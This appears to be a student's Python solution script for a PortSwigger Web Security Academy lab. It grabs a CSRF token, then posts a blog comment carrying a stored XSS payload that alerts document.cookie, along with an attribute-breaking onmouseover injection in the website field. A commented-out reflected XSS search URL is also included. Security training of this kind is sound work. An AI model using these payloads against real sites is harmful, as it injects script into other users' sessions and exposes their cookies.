import requests
from bs4 import BeautifulSoup

site = 'ac211f1f1f997a89c01127d00021001a.web-security-academy.net'

s = requests.Session()
# search_url = f'https://{site}/?search=<script>alert(1)</script>'
# resp = s.get(search_url)

blog_post_url = f'https://{site}/post?postId=1'
resp = s.get(blog_post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

comment_url = f'https://{site}/post/comment'
comment_string = '''Hello world!<script>alert(document.cookie)</script>'''
comment_data = {
    'csrf' : csrf,
    'postId' : '1',
    'comment' : comment_string,
    'name' : 'Evan La Fleur',
    'email' : 'elafleur@pdx.edu',
    'website': '''https://pdx.edu" onmouseover="alert()'''
}

resp = s.post(comment_url, data=comment_data)
resp = s.get(blog_post_url)
print(resp.text)